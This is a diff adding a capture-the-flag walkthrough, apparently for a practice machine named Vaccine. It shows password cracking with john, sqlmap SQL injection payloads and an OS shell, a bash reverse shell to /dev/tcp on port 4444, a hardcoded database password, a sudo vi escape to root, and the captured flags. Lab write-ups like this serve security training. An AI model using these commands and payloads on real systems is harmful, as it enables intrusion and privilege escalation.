@@ -648,9 +648,438 @@ af13b0bee69f8a877c3faf667f7beacf
 
 ### Enumeration
 
+Note: this starting point machine only features a root.txt
+
+We begin by running an Nmap scan.
+
 ```
 # nmap -sC -sV 10.10.10.46
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-11 05:32 EST
+Nmap scan report for 10.10.10.46
+Host is up (0.32s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
+|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
+|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: MegaCorp Login
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 24.14 seconds
 ```
 
+Running a simple Nmap scan reveals three open ports running, for FTP, SSH and Apache respectively.
 
+The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server.
+
+```
+# ftp 10.10.10.46         
+Connected to 10.10.10.46.
+220 (vsFTPd 3.0.3)
+Name (10.10.10.46:kali): ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
+226 Directory send OK.
+ftp> get backup.zip
+local: backup.zip remote: backup.zip
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for backup.zip (2533 bytes).
+226 Transfer complete.
+2533 bytes received in 0.00 secs (904.1055 kB/s)
+```
+
+A file named backup.zip is found in the folder. Extraction of the archive fails as it's password protected. The password can be cracked using JohntheRipper and rockyou.txt.
+
+```
+# zip2john backup.zip > hash                                                                ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06
+ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: 2b chk, TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A
+NOTE: It is assumed that all files in each archive have the same password.
+If that is not the case, the hash may be uncrackable. To avoid this, use
+option -o to pick a file at a time.
+
+
+# john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Node numbers 1-4 of 4 (fork)
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (backup.zip)
+1 1g 0:00:00:00 DONE (2021-03-11 05:46) 100.0g/s 25600p/s 25600c/s 25600C/s football1..simpleplan
+Waiting for 3 children to terminate
+3 0g 0:00:00:01 DONE (2021-03-11 05:46) 0g/s 2134Kp/s 2134Kc/s 2134KC/s  brian89.a6_123
+4 0g 0:00:00:01 DONE (2021-03-11 05:46) 0g/s 2121Kp/s 2121Kc/s 2121KC/s  mar ..*7¡Vamos!
+2 0g 0:00:00:01 DONE (2021-03-11 05:46) 0g/s 2084Kp/s 2084Kc/s 2084KC/s  derrickak47.abygurl69
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+The password is found to be `741852963`. Extracting it's contents using the password reveals a PHP file and a CSS file.
+
+```
+# unzip backup.zip 
+Archive:  backup.zip
+[backup.zip] index.php password: 
+  inflating: index.php               
+  inflating: style.css               
+```
+
+Looking at the PHP source code, we find a login check. 
+
+```php
+<?php
+session_start();
+  if(isset($_POST['username']) && isset($_POST['password'])) {
+    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+      $_SESSION['login'] = "true";
+      header("Location: dashboard.php");
+    }
+  }
+?>
+```
+
+The input password is hashed and compared to the MD5 hash: `2cb42f8734ea607eefed3b70af13bbd3`. This hash can be easily cracked using an online rainbow table such as crackstation.
+
+![image-20210311185500992](images/image-20210311185500992.png)
+
+The password is cracked as `qwerty789`.
+
+### Foothold
+
+Browse http://10.10.10.46/, we can see a login page for MegaCorp.
+
+![image-20200203173553218](images/login.png)
+
+The credentials `admin / qwerty789` can be used to login.
+
+![image-20200203173703008](images/dashboard.png)
+
+The page is found to host a `Car Catalogue`, and contains functionality to search for products. Searching for a term results in the following request.
+
+```
+http://10.10.10.46/dashboard.php?search=a
+```
+
+The page takes in a GET request with the parameter `search`. This URL is supplied to sqlmap, in order to test for SQL injection  vulnerabilities. The website uses cookies, which can be specified using `--cookie`.
+
+Right-click the page and select `Inspect Element`. Click the `Storage` tab and copy the PHP Session ID.
+
+![img](images/cookie.png)
+
+We can construct the Sqlmap query as follows:
+
+```bash
+# sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=2jdn17htv93irv8i5sni7ppkh7"
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.5#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:05:36 /2021-03-11/
+
+[06:05:36] [INFO] testing connection to the target URL
+[06:05:37] [INFO] checking if the target is protected by some kind of WAF/IPS
+[06:05:37] [INFO] testing if the target URL content is stable
+[06:05:37] [INFO] target URL content is stable
+[06:05:37] [INFO] testing if GET parameter 'search' is dynamic
+[06:05:38] [INFO] GET parameter 'search' appears to be dynamic
+[06:05:38] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
+[06:05:39] [INFO] heuristic (XSS) test shows that GET parameter 'search' might be vulnerable to cross-site scripting (XSS) attacks
+[06:05:39] [INFO] testing for SQL injection on GET parameter 'search'
+[06:05:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[06:05:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[06:05:43] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+[06:05:45] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[06:05:46] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[06:05:48] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[06:05:50] [INFO] testing 'Generic inline queries'
+[06:05:50] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[06:06:01] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable 
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
+[06:06:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[06:06:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[06:06:49] [INFO] target URL appears to be UNION injectable with 5 columns
+[06:06:50] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection point(s) with a total of 62 HTTP(s) requests:
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=a';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=a' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(106)||CHR(107)||CHR(113))||(CHR(102)||CHR(110)||CHR(81)||CHR(105)||CHR(113)||CHR(117)||CHR(67)||CHR(106)||CHR(83)||CHR(120)||CHR(76)||CHR(67)||CHR(103)||CHR(113)||CHR(73)||CHR(85)||CHR(102)||CHR(104)||CHR(107)||CHR(110)||CHR(114)||CHR(104)||CHR(99)||CHR(80)||CHR(81)||CHR(122)||CHR(109)||CHR(116)||CHR(112)||CHR(79)||CHR(114)||CHR(109)||CHR(71)||CHR(110)||CHR(120)||CHR(82)||CHR(118)||CHR(78)||CHR(103)||CHR(69))||(CHR(113)||CHR(106)||CHR(122)||CHR(120)||CHR(113)),NULL,NULL,NULL-- gCcK
+---
+[06:06:58] [INFO] the back-end DBMS is PostgreSQL
+back-end DBMS: PostgreSQL
+[06:07:00] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.10.46'
+
+[*] ending @ 06:07:00 /2021-03-11/
+```
+
+Sqlmap found the page to be vulnerable to multiple injections, and  identified the backend DBMS to be PostgreSQL. Getting code execution in  postgres is trivial using the `--os-shell` command.
+
+```
+# sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie="PHPSESSID=2jdn17htv93irv8i5sni7ppkh7" --os-shell
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.5#stable}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 06:08:16 /2021-03-11/
+
+[06:08:16] [INFO] resuming back-end DBMS 'postgresql' 
+[06:08:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: search (GET)
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: search=a';SELECT PG_SLEEP(5)--
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: search=a' UNION ALL SELECT NULL,(CHR(113)||CHR(120)||CHR(106)||CHR(107)||CHR(113))||(CHR(102)||CHR(110)||CHR(81)||CHR(105)||CHR(113)||CHR(117)||CHR(67)||CHR(106)||CHR(83)||CHR(120)||CHR(76)||CHR(67)||CHR(103)||CHR(113)||CHR(73)||CHR(85)||CHR(102)||CHR(104)||CHR(107)||CHR(110)||CHR(114)||CHR(104)||CHR(99)||CHR(80)||CHR(81)||CHR(122)||CHR(109)||CHR(116)||CHR(112)||CHR(79)||CHR(114)||CHR(109)||CHR(71)||CHR(110)||CHR(120)||CHR(82)||CHR(118)||CHR(78)||CHR(103)||CHR(69))||(CHR(113)||CHR(106)||CHR(122)||CHR(120)||CHR(113)),NULL,NULL,NULL-- gCcK
+---
+[06:08:17] [INFO] the back-end DBMS is PostgreSQL
+back-end DBMS: PostgreSQL
+[06:08:17] [INFO] fingerprinting the back-end DBMS operating system
+[06:08:19] [INFO] the back-end DBMS operating system is Linux
+[06:08:20] [INFO] testing if current user is DBA
+[06:08:21] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
+[06:08:21] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
+os-shell> whoami
+do you want to retrieve the command standard output? [Y/n/a] 
+command standard output:
+---
+p
+o
+s
+t
+g
+r
+e
+s
+---
+os-shell> 
+```
+
+This can be used to execute a bash reverse shell.
+
+```
+os-shell> bash -c 'bash -i >& /dev/tcp/10.10.15.4/4444 0>&1'
+do you want to retrieve the command standard output? [Y/n/a] 
+[08:37:19] [CRITICAL] connection timed out to the target URL. sqlmap is going to retry the request(s)
+```
+
+```
+$ nc -nvlp 4444                                
+listening on [any] 4444 ...
+connect to [10.10.15.4] from (UNKNOWN) [10.10.10.46] 45096
+bash: cannot set terminal process group (2134): Inappropriate ioctl for device
+bash: no job control in this shell
+postgres@vaccine:/var/lib/postgresql/11/main$ whoami
+whoami
+postgres
+```
+
+### Privilege Escalation
+
+Let's upgrade to a tty shell and continue enumeration.
+
+```
+SHELL=/bin/bash script -q /dev/null
+```
+
+Looking at the source code of `dashboard.php` in `/var/www/html` reveals the postgres password to be: `P@s5w0rd!`.
+
+```
+postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
+cd /var/www/html
+postgres@vaccine:/var/www/html$ ls        
+ls
+bg.png
+dashboard.css
+dashboard.js
+dashboard.php
+index.php
+license.txt
+style.css
+postgres@vaccine:/var/www/html$ cat dashboard.php
+cat dashboard.php
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+  <title>Admin Dashboard</title>
+  <link rel="stylesheet" href="./dashboard.css">
+  <script src="https://use.fontawesome.com/33a3739634.js"></script>
+
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<body>
+ <div id="wrapper">
+ <div class="parent">
+  <h1 align="left">MegaCorp Car Catalogue</h1>
+<form action="" method="GET">
+<div class="search-box">
+  <input type="search" name="search" placeholder="Search" />
+  <button type="submit" class="search-btn"><i class="fa fa-search"></i></button>
+</div>
+</form>
+  </div>
+  
+  <table id="keywords" cellspacing="0" cellpadding="0">
+    <thead>
+      <tr>
+        <th><span style="color: white">Name</span></th>
+        <th><span style="color: white">Type</span></th>
+        <th><span style="color: white">Fuel</span></th>
+        <th><span style="color: white">Engine</span></th>
+      </tr>
+    </thead>
+    <tbody>
+	<?php
+	session_start();
+	if($_SESSION['login'] !== "true") {
+	  header("Location: index.php");
+	  die();
+	}
+	try {
+	  $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
+	}
+
+	catch ( exception $e ) {
+	  echo $e->getMessage();
+	}
+
+	if(isset($_REQUEST['search'])) {
+
+	  $q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";
+
+	  $result = pg_query($conn,$q);
+
+	  if (!$result)
+	  {
+			    die(pg_last_error($conn));
+	  }
+	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+	      {
+		echo "
+		  <tr>
+		    <td class='lalign'>$row[1]</td>
+		    <td>$row[2]</td>
+		    <td>$row[3]</td>
+		    <td>$row[4]</td>
+		  </tr>";
+	    }
+	}
+	else {
+		
+	  $q = "Select * from cars";
+
+	  $result = pg_query($conn,$q);
+
+	  if (!$result)
+	  {
+			    die(pg_last_error($conn));
+	  }
+	  while($row = pg_fetch_array($result, NULL, PGSQL_NUM))
+	      {
+		echo "
+		  <tr>
+		    <td class='lalign'>$row[1]</td>
+		    <td>$row[2]</td>
+		    <td>$row[3]</td>
+		    <td>$row[4]</td>
+		  </tr>";
+	    }
+	}
+
+
+      ?>
+    </tbody>
+  </table>
+ </div> 
+</body>
+<!-- partial -->
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'></script>
+<script src='https://cdnjs.cloudflare.com/ajax/libs/jquery.tablesorter/2.28.14/js/jquery.tablesorter.min.js'></script><script  src="./dashboard.js"></script>
+
+</body>
+</html>
+postgres@vaccine:/var/www/html$ 
+
+```
+
+This password can be used to view the user's sudo privileges.
+
+```
+postgres@vaccine:/var/lib/postgresql/11/main$ python3 -c "import pty;pty.spawn('/bin/bash')"
+
+postgres@vaccine:/var/www/html$ sudo -l
+sudo -l
+[sudo] password for postgres: P@s5w0rd!
+
+Matching Defaults entries for postgres on vaccine:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+
+postgres@vaccine:/var/lib/postgresql/11/main$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+The user is allowed to edit the configuration `/etc/postgresql/11/main/pg_hba.conf` using vi. This can be leveraged to gain a root shell and access root.txt.
+
+```
+:!/bin/bash
+root@vaccine:/var/lib/postgresql/11/main# whoami
+root
+root@vaccine:/var/lib/postgresql/11/main#cd /
+root@vaccine:/# ls
+ls
+bin    etc             lib     lost+found  proc  snap      tmp      vmlinuz.old
+boot   home            lib32   media       root  srv       usr
+cdrom  initrd.img      lib64   mnt         run   swap.img  var
+dev    initrd.img.old  libx32  opt         sbin  sys       vmlinuz
+root@vaccine:/# cd root	
+cd root
+root@vaccine:~# ls
+ls
+pg_hba.conf  root.txt  snap
+root@vaccine:~# cat root.txt
+cat root.txt
+dd6e058e814260bc70e9bbdef2715849
+root@vaccine:~# 
+```
 
